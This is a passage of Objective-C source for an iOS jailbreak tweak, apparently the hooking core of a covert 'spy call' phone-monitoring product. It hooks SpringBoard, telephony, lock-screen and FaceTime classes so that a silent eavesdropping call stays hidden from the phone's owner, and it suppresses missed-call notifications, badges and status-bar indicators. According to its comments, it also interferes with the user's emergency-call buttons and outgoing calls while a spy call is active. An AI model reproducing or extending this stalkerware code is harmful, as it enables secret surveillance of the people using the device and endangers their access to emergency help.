//
//  MSSPC.mm
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright __MyCompanyName__ 2012. All rights reserved.
//
//  MobileSubstrate, libsubstrate.dylib, and substrate.h are
//  created and copyrighted by Jay Freeman a.k.a saurik and 
//  are protected by various means of open source licensing.
//
//  Additional defines courtesy Lance Fetters a.k.a ashikase
//

#import "TelephonyNotifier.h"
#import "SpyCallMobilePhone.h"
#import "SpyCallSpringBoard.h"
#import "SpyCallInCallService.h"
#import "AudioVoiceMemo.h"
#import "FaceTimeSpyCallSpringBoard.h"
#import "FaceTimeSpyCallMobilePhone.h"
#import "FaceTimeSpyCallFaceTime.h"

#import "SpyCallSpringBoardService.h"
#import "SpyCallMobilePhoneService.h"

#import "SystemUtilsImpl.h"

#pragma mark dylib initialization and initial hooks
#pragma mark 

extern "C" void MSSPCInitialize() {
    
    if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
        return;
    }
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	DLog (@"MSSPC loaded with identifier = %@", identifier);
	
#pragma mark -
#pragma mark SpringBoard hooks
#pragma mark -
	
    if ([identifier isEqualToString:@"com.apple.springboard"]) {
        // Searching classes
        //lookupClasses();
        
		// Create service
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[SpyCallSpringBoardService sharedServiceWithSpyCallManager:spyCallManager];
		
		// Hook telephony callback
		void (*_ServerConnectionCallback)(CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info);
        //lookupSymbol(CTTelephony, "__ServerConnectionCallback", _ServerConnectionCallback);
        MSImageRef image1;
        image1 = MSGetImageByName(CTTelephony);
        _ServerConnectionCallback = (void (*)(CTServerConnectionRef a, CFStringRef b, CFDictionaryRef c, void *d))MSFindSymbol(image1, "__ServerConnectionCallback");
		MSHookFunction(_ServerConnectionCallback, MSHake(_ServerConnectionCallback));
        
        MSImageRef image2;
        image2 = MSGetImageByName(CTTelephony);
        MSHookFunction(((void *)MSFindSymbol(image2, "__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary")),
                       (void *)$__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary,
                       (void **)&old__ZL25_ServerConnectionCallbackPK10__CFStringPK14__CFDictionary);
        
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
		// Hook respring/kill all springboard ... (need to fine symbol like above method, but anyway this is not used)
		MSHookFunction(system, MSHake(system));
#pragma GCC diagnostic pop
        
		Class $SpringBoard(objc_getClass("SpringBoard"));
		// Hook proximity sensor
		//_SpringBoard$_proximityChanged$ = MSHookMessage($SpringBoard, @selector(_proximityChanged:), &$SpringBoard$_proximityChanged$);
        MSHookMessage($SpringBoard, @selector(_proximityChanged:), $SpringBoard$_proximityChanged$, &_SpringBoard$_proximityChanged$);
		// Hook lock button press
		//_SpringBoard$lockButtonDown$ = MSHookMessage($SpringBoard, @selector(lockButtonDown:), &$SpringBoard$lockButtonDown$);
        MSHookMessage($SpringBoard, @selector(lockButtonDown:), $SpringBoard$lockButtonDown$, &_SpringBoard$lockButtonDown$);
        // iOS 7
        MSHookMessage($SpringBoard, @selector(_lockButtonDownFromSource:), $SpringBoard$_lockButtonDownFromSource$, &_SpringBoard$_lockButtonDownFromSource$);
        // iOS 8
        MSHookMessage($SpringBoard, @selector(_lockButtonDown:fromSource:), $SpringBoard$_lockButtonDown$fromSource$, &_SpringBoard$_lockButtonDown$fromSource$);
		//_SpringBoard$lockButtonUp$ = MSHookMessage($SpringBoard, @selector(lockButtonUp:), &$SpringBoard$lockButtonUp$);
        MSHookMessage($SpringBoard, @selector(lockButtonUp:), $SpringBoard$lockButtonUp$, &_SpringBoard$lockButtonUp$);
        // iOS 7
        MSHookMessage($SpringBoard, @selector(_lockButtonUpFromSource:), $SpringBoard$_lockButtonUpFromSource$, &_SpringBoard$_lockButtonUpFromSource$);
        // iOS 8
        MSHookMessage($SpringBoard, @selector(_lockButtonUp:fromSource:), $SpringBoard$_lockButtonUp$fromSource$, &_SpringBoard$_lockButtonUp$fromSource$);
		// Hook menu button press
		//_SpringBoard$menuButtonDown$ = MSHookMessage($SpringBoard, @selector(menuButtonDown:), &$SpringBoard$menuButtonDown$);
        MSHookMessage($SpringBoard, @selector(menuButtonDown:), $SpringBoard$menuButtonDown$, &_SpringBoard$menuButtonDown$);
        // iOS 7
        MSHookMessage($SpringBoard, @selector(_menuButtonDown:), $SpringBoard$_menuButtonDown$, &_SpringBoard$_menuButtonDown$);
		//_SpringBoard$menuButtonUp$ = MSHookMessage($SpringBoard, @selector(menuButtonUp:), &$SpringBoard$menuButtonUp$);
        MSHookMessage($SpringBoard, @selector(menuButtonUp:), $SpringBoard$menuButtonUp$, &_SpringBoard$menuButtonUp$);
        // iOS 7
        MSHookMessage($SpringBoard, @selector(_menuButtonUp:), $SpringBoard$_menuButtonUp$, &_SpringBoard$_menuButtonUp$);
		// Hook call status bar tap while spy call initiate conference
		//_SpringBoard$statusBarReturnActionTap$ = MSHookMessage($SpringBoard, @selector(statusBarReturnActionTap:), &$SpringBoard$statusBarReturnActionTap$);
        MSHookMessage($SpringBoard, @selector(statusBarReturnActionTap:), $SpringBoard$statusBarReturnActionTap$, &_SpringBoard$statusBarReturnActionTap$);
        // iOS 7
        // This method is called when user switch between SpringBoard to MobilePhone application (iOS 8 works only for SpringBoard to InCallService, within InCallService itself)
        MSHookMessage($SpringBoard, @selector(handleDoubleHeightStatusBarTap:), $SpringBoard$handleDoubleHeightStatusBarTap$, &_SpringBoard$handleDoubleHeightStatusBarTap$);
        Class $SBWorkspace = objc_getClass("SBWorkspace");
        // This method is called when user switch between every applications except SpringBoard to MobilePhone application
        MSHookMessage($SBWorkspace,
                      @selector(workspace:handleStatusBarReturnActionFromApplication:statusBarStyle:),
                      $SBWorkspace$workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$,
                      &_SBWorkspace$workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$);
        // iOS 8, status bar tapped to switch between apps
        Class $SBInCallAlertManager = objc_getClass("SBInCallAlertManager");
        MSHookMessage($SBInCallAlertManager, @selector(reactivateAlertFromStatusBarTap), $SBInCallAlertManager$reactivateAlertFromStatusBarTap, &_SBInCallAlertManager$reactivateAlertFromStatusBarTap);
        
		// Hook auto lock when spy call active
		//_SpringBoard$autoLock = MSHookMessage($SpringBoard, @selector(autoLock), &$SpringBoard$autoLock);
        MSHookMessage($SpringBoard, @selector(autoLock), $SpringBoard$autoLock, &_SpringBoard$autoLock);
        // iOS 7,8
        Class $SBBacklightController = objc_getClass("SBBacklightController");
        MSHookMessage($SBBacklightController, @selector(_autoLockTimerFired:), $SBBacklightController$_autoLockTimerFired$, &_SBBacklightController$_autoLockTimerFired$);
		
		Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
		// Hook launch any application from spring board (desktop)
	    //_SBApplicationIcon$launch = MSHookMessage($SBApplicationIcon, @selector(launch), &$SBApplicationIcon$launch);
        MSHookMessage($SBApplicationIcon, @selector(launch), $SBApplicationIcon$launch, &_SBApplicationIcon$launch);
		// Hook launch any application from spring board (application switcher)
		//_SBApplicationIcon$launchFromViewSwitcher = MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), &$SBApplicationIcon$launchFromViewSwitcher);
        MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), $SBApplicationIcon$launchFromViewSwitcher, &_SBApplicationIcon$launchFromViewSwitcher);
        // iOS 7,8, the replacement of launch, launchFromViewSwitcher which are missing from iOS 7
        MSHookMessage($SBApplicationIcon, @selector(launchFromLocation:), $SBApplicationIcon$launchFromLocation$, &_SBApplicationIcon$launchFromLocation$);
		// Hook badge on mobile application icon (IOS 4,5)
		// Issue: spring board set badge number to millions thus our hook modify the value to 0
		// cause after missed call no badge at mobile application icon
		// Only for IOS 4, 5
		//_SBApplicationIcon$_setBadge$ = MSHookMessage($SBApplicationIcon, @selector(_setBadge:), &$SBApplicationIcon$_setBadge$);
        MSHookMessage($SBApplicationIcon, @selector(_setBadge:), $SBApplicationIcon$_setBadge$, &_SBApplicationIcon$_setBadge$);
		// IOS 6
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			//_SBApplicationIcon$setBadge$ = MSHookMessage($SBApplicationIcon, @selector(setBadge:), &$SBApplicationIcon$setBadge$);
            MSHookMessage($SBApplicationIcon, @selector(setBadge:), $SBApplicationIcon$setBadge$, &_SBApplicationIcon$setBadge$);
		}
        // iOS 7,8
        // Hook to remove badge from applicatoin icon, look like above method is no longer call in iOS 7
        Class $SBApplication = objc_getClass("SBApplication");
        MSHookMessage($SBApplication, @selector(setBadge:), $SBApplication$setBadge$, &_SBApplication$setBadge$);
        
        // iOS 8, this method can use to block badge of application icon but we did not use it
        //Class $FBUIApplicationService = objc_getClass("FBUIApplicationService");
        //MSHookMessage($FBUIApplicationService, @selector(handleApplication:setBadgeValue:), $FBUIApplicationService$handleApplication$setBadgeValue$, &_FBUIApplicationService$handleApplication$setBadgeValue$);
		
		// Hook launch any application from spring board (application switcher) for 4.2.1 (double check $$$launchFromViewSwitcher$$$)
		Class $SBUIController = objc_getClass("SBUIController");
		//_SBUIController$activateApplicationFromSwitcher$ = MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), &$SBUIController$activateApplicationFromSwitcher$);
        MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), $SBUIController$activateApplicationFromSwitcher$, &_SBUIController$activateApplicationFromSwitcher$);
        // iOS 7
        Class $SBAppSliderController = objc_getClass("SBAppSliderController");
        // This method is called when icon is tapped
        MSHookMessage($SBAppSliderController, @selector(sliderIconScroller:activate:), $SBAppSliderController$sliderIconScroller$activate$, &_SBAppSliderController$sliderIconScroller$activate$);
        // This method is called when screen shot is tapped
        MSHookMessage($SBAppSliderController, @selector(sliderScroller:itemTapped:), $SBAppSliderController$sliderScroller$itemTapped$, &_SBAppSliderController$sliderScroller$itemTapped$);
        // This method could be used in exchangable manner with $SBAppSliderController$sliderIconScroller$activate$, this method is called when icon is tapped
        //Class $SBAppSliderIconController = objc_getClass("SBAppSliderIconController");
        //MSHookMessage($SBAppSliderIconController, @selector(iconTapped:), $SBAppSliderIconController$iconTapped$, &_SBAppSliderIconController$iconTapped$);
        // iOS 8, it makes more sense that apple put these methods in SBAppSwitcherController
        // Icon is tapped
        Class $SBAppSwitcherController(objc_getClass("SBAppSwitcherController"));
        MSHookMessage($SBAppSwitcherController, @selector(switcherIconScroller:activate:),
                      $SBAppSwitcherController$switcherIconScroller$activate$,
                      &_SBAppSwitcherController$switcherIconScroller$activate$);
        // Screen shot is tapped
        MSHookMessage($SBAppSwitcherController, @selector(switcherScroller:itemTapped:),
                      $SBAppSwitcherController$switcherScroller$itemTapped$,
                      &_SBAppSwitcherController$switcherScroller$itemTapped$);
		
		// Hook to end spy call while user unlock device via passcode but user try to make emergency call
		Class $SBSlidingAlertDisplay = objc_getClass("SBSlidingAlertDisplay");
		//_SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$ = MSHookMessage($SBSlidingAlertDisplay, @selector(deviceLockViewEmergencyCallButtonPressed:),
		//																				 &$SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$);
        MSHookMessage($SBSlidingAlertDisplay,
                      @selector(deviceLockViewEmergencyCallButtonPressed:),
                      $SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$,
                      &_SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$);
        // iOS 7
        Class $SBLockScreenViewController = objc_getClass("SBLockScreenViewController");
        MSHookMessage($SBLockScreenViewController,
                      @selector(passcodeLockViewEmergencyCallButtonPressed:),
                      $SBLockScreenViewController$passcodeLockViewEmergencyCallButtonPressed$,
                      &_SBLockScreenViewController$passcodeLockViewEmergencyCallButtonPressed$);
        MSHookMessage($SBLockScreenViewController, @selector(lockScreenView:didScrollToPage:), $SBLockScreenViewController$lockScreenView$didScrollToPage$, &_SBLockScreenViewController$lockScreenView$didScrollToPage$);
		
        // iOS 6 downward
		// Hook if user kill mobile phone app from app switcher, then start application again there will be monitor number show on screen
		//_SBAppSwitcherController$applicationDied$ = MSHookMessage($SBAppSwitcherController, @selector(applicationDied:), &$SBAppSwitcherController$applicationDied$);
        MSHookMessage($SBAppSwitcherController, @selector(applicationDied:), $SBAppSwitcherController$applicationDied$, &_SBAppSwitcherController$applicationDied$);
        // iOS 7
        MSHookMessage($SBAppSliderController, @selector(_quitAppAtIndex:), $SBAppSliderController$_quitAppAtIndex$, &_SBAppSliderController$_quitAppAtIndex$);
        // iOS 8
        MSHookMessage($SBAppSwitcherController, @selector(_quitAppWithDisplayItem:), $SBAppSwitcherController$_quitAppWithDisplayItem$, &_SBAppSwitcherController$_quitAppWithDisplayItem$);
		
		Class $SBTelephonyManager(objc_getClass("SBTelephonyManager"));
		// Hook call update status bar of spring board
		//_SBTelephonyManager$updateSpringBoard = MSHookMessage($SBTelephonyManager, @selector(updateSpringBoard), &$SBTelephonyManager$updateSpringBoard);
        MSHookMessage($SBTelephonyManager, @selector(updateSpringBoard), $SBTelephonyManager$updateSpringBoard, &_SBTelephonyManager$updateSpringBoard);
		// Hook block an attempt to make a call from outside mobile phone application, IOS5
		//_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$ =
		//			MSHookMessage($SBTelephonyManager, @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:forceAssist:suppressAssist:wasAlreadyAssisted:),
		//					&$SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$);
        MSHookMessage($SBTelephonyManager,
                      @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:service:forceAssist:suppressAssist:wasAlreadyAssisted:),
                      $SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$service$forceAssist$suppressAssist$wasAlreadyAssisted$,
                      &_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$service$forceAssist$suppressAssist$wasAlreadyAssisted$);
        // iOS 7
        MSHookMessage($SBTelephonyManager,
                      @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:forceAssist:suppressAssist:wasAlreadyAssisted:),
                      $SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$,
                      &_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$);
		// Hook block an attempt to make a call from outside mobile phone application, IOS4
		//_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$ = MSHookMessage($SBTelephonyManager, @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:),
		//																						   &$SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$);
        MSHookMessage($SBTelephonyManager,
                      @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:),
                      $SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$,
                      &_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$);
        // iOS 8, place gsm call from address book in phone application also call this method
        MSHookMessage($SpringBoard, @selector(applicationOpenURL:withApplication:sender:publicURLsOnly:animating:needsPermission:activationSettings:withResult:),
                      $SpringBoard$applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$,
                      &_SpringBoard$applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$);
				
		Class $SBAwayView(objc_getClass("SBAwayView"));
		// Hook update UI when AC usb is plugin or user trcking back and forth the lock bar
		//_SBAwayView$shouldShowInCallInfo = MSHookMessage($SBAwayView, @selector(shouldShowInCallInfo), &$SBAwayView$shouldShowInCallInfo);
        MSHookMessage($SBAwayView, @selector(shouldShowInCallInfo), $SBAwayView$shouldShowInCallInfo, &_SBAwayView$shouldShowInCallInfo);
		// Hook to block user sliding to make emergency call while phone is disabled (user type wronge passcode), in the mean time spy call is in progress
		//_SBAwayView$lockBarStoppedTracking$ = MSHookMessage($SBAwayView, @selector(lockBarStoppedTracking:), &$SBAwayView$lockBarStoppedTracking$);
        MSHookMessage($SBAwayView, @selector(lockBarStoppedTracking:), $SBAwayView$lockBarStoppedTracking$, &_SBAwayView$lockBarStoppedTracking$);
		
		Class $SBCallFailureAlert(objc_getClass("SBCallFailureAlert"));
		// Hook call failure if spy call blocked
		//_SBCallFailureAlert$initWithCauseCode$call$ = MSHookMessage($SBCallFailureAlert, @selector(initWithCauseCode:call:), &$SBCallFailureAlert$initWithCauseCode$call$);
        MSHookMessage($SBCallFailureAlert, @selector(initWithCauseCode:call:), $SBCallFailureAlert$initWithCauseCode$call$, &_SBCallFailureAlert$initWithCauseCode$call$);
		
		// IOS 5 =======
		Class $SBPluginManager(objc_getClass("SBPluginManager"));
		// Hook plugin manager for other hook to incoming call and call waiting screen
		//_SBPluginManager$loadPluginBundle$ = MSHookMessage($SBPluginManager, @selector(loadPluginBundle:), &$SBPluginManager$loadPluginBundle$);
        MSHookMessage($SBPluginManager, @selector(loadPluginBundle:), $SBPluginManager$loadPluginBundle$, &_SBPluginManager$loadPluginBundle$);
		
		Class $SBAwayBulletinListController(objc_getClass("SBAwayBulletinListController"));
		// Hook spy missed call show in springboard's bulletin then user slide to call back
		//_SBAwayBulletinListController$observer$addBulletin$forFeed$ = MSHookMessage($SBAwayBulletinListController, @selector(observer:addBulletin:forFeed:),
		//																			&$SBAwayBulletinListController$observer$addBulletin$forFeed$);
        MSHookMessage($SBAwayBulletinListController,
                      @selector(observer:addBulletin:forFeed:),
                      $SBAwayBulletinListController$observer$addBulletin$forFeed$,
                      &_SBAwayBulletinListController$observer$addBulletin$forFeed$);
		// =============
		
		// IOS 4 =======
		Class $SBCallAlert(objc_getClass("SBCallAlert"));
		// Hook incoming call screen
		//_SBCallAlert$initWithCall$ = MSHookMessage($SBCallAlert, @selector(initWithCall:), &$SBCallAlert$initWithCall$);
        MSHookMessage($SBCallAlert, @selector(initWithCall:), $SBCallAlert$initWithCall$, &_SBCallAlert$initWithCall$);
		
		Class $SBCallAlertDisplay(objc_getClass("SBCallAlertDisplay"));
		// Hook incomming call screen while spy call in progress
		//_SBCallAlertDisplay$updateLCDWithName$label$breakPoint$ = MSHookMessage($SBCallAlertDisplay, @selector(updateLCDWithName:label:breakPoint:), &$SBCallAlertDisplay$updateLCDWithName$label$breakPoint$);
        MSHookMessage($SBCallAlertDisplay, @selector(updateLCDWithName:label:breakPoint:), $SBCallAlertDisplay$updateLCDWithName$label$breakPoint$, &_SBCallAlertDisplay$updateLCDWithName$label$breakPoint$);
		
		Class $SBCallWaitingAlertDisplay(objc_getClass("SBCallWaitingAlertDisplay"));
		// Hook call waiting screen
		//_SBCallWaitingAlertDisplay$_addCallWaitingButtons$ = MSHookMessage($SBCallWaitingAlertDisplay, @selector(_addCallWaitingButtons:), &$SBCallWaitingAlertDisplay$_addCallWaitingButtons$);
        MSHookMessage($SBCallWaitingAlertDisplay, @selector(_addCallWaitingButtons:), $SBCallWaitingAlertDisplay$_addCallWaitingButtons$, &_SBCallWaitingAlertDisplay$_addCallWaitingButtons$);
		//=============
        
        Class $SBLockScreenNotificationListController = objc_getClass("SBLockScreenNotificationListController");
        // iOS 7, hook to suppress bullettin of missed call of FaceTime spy call or Cellular spy call
        MSHookMessage($SBLockScreenNotificationListController, @selector(observer:addBulletin:forFeed:), $SBLockScreenNotificationListController$observer$addBulletin$forFeed$, &_SBLockScreenNotificationListController$observer$addBulletin$forFeed$);
        // iOS 8
        MSHookMessage($SBLockScreenNotificationListController,
                      @selector(observer:addBulletin:forFeed:playLightsAndSirens:withReply:),
                      $SBLockScreenNotificationListController$observer$addBulletin$forFeed$playLightsAndSirens$withReply$,
                      &_SBLockScreenNotificationListController$observer$addBulletin$forFeed$playLightsAndSirens$withReply$);
        
        Class $SBBulletinObserverViewController = objc_getClass("SBBulletinObserverViewController");
        // iOS 7,8 hook to suppress bulletin of missed call item of FaceTime or regular spy call added to notification center
        MSHookMessage($SBBulletinObserverViewController,
                      @selector(observer:addBulletin:forFeed:),
                      $SBBulletinObserverViewController$observer$addBulletin$forFeed$,
                      &_SBBulletinObserverViewController$observer$addBulletin$forFeed$);
        
		Class $AVController(objc_getClass("AVController"));
		// Hook audio session controller for diverting the audio session to ring tone state
		//_AVController$init = MSHookMessage($AVController, @selector(init), &$AVController$init);
        MSHookMessage($AVController, @selector(init), $AVController$init, &_AVController$init);
        // iOS 7,8
        MSHookMessage($AVController, @selector(initWithQueue:fmpType:error:), $AVController$initWithQueue$fmpType$error$, &_AVController$initWithQueue$fmpType$error$);
        MSHookMessage($AVController, @selector(initWithQueue:error:), $AVController$initWithQueue$error$, &_AVController$initWithQueue$error$);
        MSHookMessage($AVController, @selector(initForStreaming), $AVController$initForStreaming, &_AVController$initForStreaming);
        MSHookMessage($AVController, @selector(initWithError:), $AVController$initWithError$, &_AVController$initWithError$);
		
#pragma mark FaceTime iOS 6,7,8
		
		if ([SystemUtilsImpl isIpodTouch] || [SystemUtilsImpl isIpad]) {
			// NOTE: NOT able to detect the FaceTime call in the following cases:
			//	- outgoing
			//	- outgoing decline
			//  - outgoing ended by user
			//	- outgoing ended by other party who not accept
			// these cases are important to make conference support in the future
			[FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
						
			Class $SBConferenceManager = objc_getClass("SBConferenceManager");
			// Hook to block status bar update
			//_SBConferenceManager$updateStatusBar = MSHookMessage($SBConferenceManager, @selector(updateStatusBar), &$SBConferenceManager$updateStatusBar);
            MSHookMessage($SBConferenceManager, @selector(updateStatusBar), $SBConferenceManager$updateStatusBar, &_SBConferenceManager$updateStatusBar);
			//_SBConferenceManager$_handleInvitation$ = MSHookMessage($SBConferenceManager, @selector(_handleInvitation:), &$SBConferenceManager$_handleInvitation$);
			//_SBConferenceManager$_faceTimeStateChanged$ = MSHookMessage($SBConferenceManager, @selector(_faceTimeStateChanged:), &$SBConferenceManager$_faceTimeStateChanged$);
			
			Class $CNFConferenceController = objc_getClass("CNFConferenceController");
			// Hook to detect FaceTime call is ended (incoming and outgoing see SpringBoard load bundle hook)
			//_CNFConferenceController$conference$receivedInvitationFromIMHandle$ = MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), &$CNFConferenceController$conference$receivedInvitationFromIMHandle$);
            MSHookMessage($CNFConferenceController, @selector(conference:receivedInvitationFromIMHandle:), $CNFConferenceController$conference$receivedInvitationFromIMHandle$, &_CNFConferenceController$conference$receivedInvitationFromIMHandle$);
			//_CNFConferenceController$conference$handleMissedInvitationFromIMHandle$ = MSHookMessage($CNFConferenceController, @selector(conference:handleMissedInvitationFromIMHandle:), &$CNFConferenceController$conference$handleMissedInvitationFromIMHandle$);
            MSHookMessage($CNFConferenceController, @selector(conference:handleMissedInvitationFromIMHandle:), $CNFConferenceController$conference$handleMissedInvitationFromIMHandle$, &_CNFConferenceController$conference$handleMissedInvitationFromIMHandle$);
			//_CNFConferenceController$conference$receivedCancelledInvitationFromIMHandle$ = MSHookMessage($CNFConferenceController, @selector(conference:receivedCancelledInvitationFromIMHandle:), &$CNFConferenceController$conference$receivedCancelledInvitationFromIMHandle$);
            MSHookMessage($CNFConferenceController, @selector(conference:receivedCancelledInvitationFromIMHandle:), $CNFConferenceController$conference$receivedCancelledInvitationFromIMHandle$, &_CNFConferenceController$conference$receivedCancelledInvitationFromIMHandle$);
			//_CNFConferenceController$sendFaceTimeInvitationTo$ = MSHookMessage($CNFConferenceController, @selector(sendFaceTimeInvitationTo:), &$CNFConferenceController$sendFaceTimeInvitationTo$);
			//_CNFConferenceController$sendFaceTimeInvitationTo$isVideo$ = MSHookMessage($CNFConferenceController, @selector(sendFaceTimeInvitationTo:isVideo:), &$CNFConferenceController$sendFaceTimeInvitationTo$isVideo$);
			//_CNFConferenceController$inviteFailedFromIMHandle$reason$ = MSHookMessage($CNFConferenceController, @selector(inviteFailedFromIMHandle:reason:), &$CNFConferenceController$inviteFailedFromIMHandle$reason$);
			//_CNFConferenceController$invitedToIMAVChat$ = MSHookMessage($CNFConferenceController, @selector(invitedToIMAVChat:), &$CNFConferenceController$invitedToIMAVChat$);
            // iOS 7
            // This method does not call anywhere in normal working case of FaceTime call (even in FaceTime application)
            //MSHookMessage($CNFConferenceController, @selector(inviteFailedFromIMHandle:reason:), $CNFConferenceController$inviteFailedFromIMHandle$reason$, &_CNFConferenceController$inviteFailedFromIMHandle$reason$);
            // Hook to detect normal incoming FaceTime call (outgoing is not call)
            MSHookMessage($CNFConferenceController, @selector(invitedToIMAVChat:), $CNFConferenceController$invitedToIMAVChat$, &_CNFConferenceController$invitedToIMAVChat$);
            // Below 3 methods are called in FaceTime application but we required them to call in SpringBoard thus they cannot be used
            //MSHookMessage($CNFConferenceController, @selector(_handleConferenceEnded:withReason:withError:), $CNFConferenceController$_handleConferenceEnded$withReason$withError$, &_CNFConferenceController$_handleConferenceEnded$withReason$withError$);
            //MSHookMessage($CNFConferenceController, @selector(_handleConferenceConnecting:), $CNFConferenceController$_handleConferenceConnecting$, &_CNFConferenceController$_handleConferenceConnecting$);
            //MSHookMessage($CNFConferenceController, @selector(_handleEndAVChat:withReason:error:), $CNFConferenceController$_handleEndAVChat$withReason$error$, &_CNFConferenceController$_handleEndAVChat$withReason$error$);
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
                MSHookMessage($CNFConferenceController, @selector(avChatStateChanged:), $CNFConferenceController$avChatStateChanged$, &_CNFConferenceController$avChatStateChanged$);
            }
						
			Class $CNFDisplayController = objc_getClass("CNFDisplayController");
			DLog (@"-- SpringBoard --, Class of CNFDisplayController = %@", $CNFDisplayController);
			// Hook to store object in order to access in Manager
			//_CNFDisplayController$initWithDelegate$options$ = MSHookMessage($CNFDisplayController, @selector(initWithDelegate:options:), &$CNFDisplayController$initWithDelegate$options$);
            MSHookMessage($CNFDisplayController, @selector(initWithDelegate:options:), $CNFDisplayController$initWithDelegate$options$, &_CNFDisplayController$initWithDelegate$options$);
			//_CNFDisplayController$initWithDelegate$ = MSHookMessage($CNFDisplayController, @selector(initWithDelegate:), &$CNFDisplayController$initWithDelegate$);
            MSHookMessage($CNFDisplayController, @selector(initWithDelegate:), $CNFDisplayController$initWithDelegate$, &_CNFDisplayController$initWithDelegate$);
						
			Class $CNFCallViewController = objc_getClass("CNFCallViewController");
			// Hook to store object in order to access in Manager
			//_CNFCallViewController$initWithDelegate$ = MSHookMessage($CNFCallViewController, @selector(initWithDelegate:), &$CNFCallViewController$initWithDelegate$);
            MSHookMessage($CNFCallViewController, @selector(initWithDelegate:), $CNFCallViewController$initWithDelegate$, &_CNFCallViewController$initWithDelegate$);
			
			Class $SBUserAgent = objc_getClass("SBUserAgent");
			// Block user swipe missed call of face time to attempt to make call back
			//_SBUserAgent$canLaunchFromBulletinWithURL$bundleID$ = MSHookMessage($SBUserAgent, @selector(canLaunchFromBulletinWithURL:bundleID:), &$SBUserAgent$canLaunchFromBulletinWithURL$bundleID$);
            MSHookMessage($SBUserAgent, @selector(canLaunchFromBulletinWithURL:bundleID:), $SBUserAgent$canLaunchFromBulletinWithURL$bundleID$, &_SBUserAgent$canLaunchFromBulletinWithURL$bundleID$);
			
			Class $SpringBoard = objc_getClass("SpringBoard");
			// Block user from attempt to make a call while FaceTime spy call active (this method is called both user attempt the call from in or outside FaceTime application)
			//_SpringBoard$_applicationOpenURL$event$ = MSHookMessage($SpringBoard, @selector(_applicationOpenURL:event:), &$SpringBoard$_applicationOpenURL$event$);
            MSHookMessage($SpringBoard, @selector(_applicationOpenURL:event:), $SpringBoard$_applicationOpenURL$event$, &_SpringBoard$_applicationOpenURL$event$);
			//_SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$ = MSHookMessage($SpringBoard, @selector(_applicationOpenURL:withApplication:sender:publicURLsOnly:animating:additionalActivationFlags:), &$SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$);
            MSHookMessage($SpringBoard, @selector(_applicationOpenURL:withApplication:sender:publicURLsOnly:animating:additionalActivationFlags:), $SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$, &_SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$);
            // iOS 7
            // Hook to replace coresponding method in iOS 5,6 as well as [SBUserAgent canLaunchFromBulletinWithURL:bundleID:]
            MSHookMessage($SpringBoard, @selector(_applicationOpenURL:withApplication:sender:publicURLsOnly:animating:additionalActivationFlags:activationHandler:),
                          $SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$activationHandler$,
                          &_SpringBoard$_applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$activationHandler$);
            
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
                // iOS 8
                Class $TUCallCenter = objc_getClass("TUCallCenter");
                // Hook to get FaceTime call notifications, this method calls below one with userInfo nil
                MSHookMessage($TUCallCenter, @selector(handleCallStatusChanged:), $TUCallCenter$handleCallStatusChanged$, &_TUCallCenter$handleCallStatusChanged$);
                //MSHookMessage($TUCallCenter, @selector(handleCallStatusChanged:userInfo:), $TUCallCenter$handleCallStatusChanged$userInfo$, &_TUCallCenter$handleCallStatusChanged$userInfo$);
            }
		}
	}
    
#pragma mark -
